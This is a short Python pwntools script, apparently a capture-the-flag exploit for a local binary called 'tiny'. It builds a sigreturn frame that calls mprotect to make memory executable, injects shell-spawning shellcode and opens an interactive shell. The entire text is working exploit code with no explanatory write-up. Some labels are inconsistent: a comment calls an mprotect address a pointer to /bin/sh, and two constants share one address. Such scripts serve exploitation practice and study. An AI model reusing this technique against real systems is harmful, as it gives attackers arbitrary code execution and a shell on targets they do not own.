from pwn import *

e = context.binary = ELF("./tiny")


r = e.process()
ret = 0x4000C0 
target = 0x400000
pause()

payload  = b""
payload += p64(0x4000B0)


BINSH = 0x4000Be
POP_RAX = 0x41018
SYSCALL_RET = 0x4000Be

frame = SigreturnFrame()
frame.rax = 10
frame.rdi = target           # pointer to /bin/sh
frame.rsi = 0x500
frame.rdx = 7
frame.rip = SYSCALL_RET
frame.rsp = 0x400128

payload  = p64(0x4000B0)
payload += p64(ret)
payload += p64(ret)
payload += p64(SYSCALL_RET)
payload += bytes(frame)
payload = payload.ljust(0x400, b"a")

print(payload)

r.send(payload)

payload = p64(ret) * 2
payload = payload[:-1]

r.send(payload)


pause()
shellcode = asm(shellcraft.sh())
print(len(shellcode))
payload = p64(0x400138)
payload += shellcode
r.sendline(payload)

r.interactive()